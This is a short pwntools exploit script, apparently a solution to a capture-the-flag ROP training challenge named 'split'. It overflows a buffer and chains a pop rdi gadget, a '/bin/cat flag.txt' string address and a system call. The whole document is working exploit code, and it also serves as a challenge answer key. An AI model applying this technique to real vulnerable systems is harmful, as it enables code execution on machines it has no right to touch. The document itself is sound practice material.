from pwn import *

#io = gdb.debug('./split', 'b main')
io = process('./split')

p = b'A'*40
p += p64(0x4007c3) 
p += p64(0x601060)
p += p64(0x40074b)

io.sendline(p)
io.interactive()

# 0x4007c3 # pop rdi
# 0x601060 # /bin/cat flag.txt
# 0x40074b # system
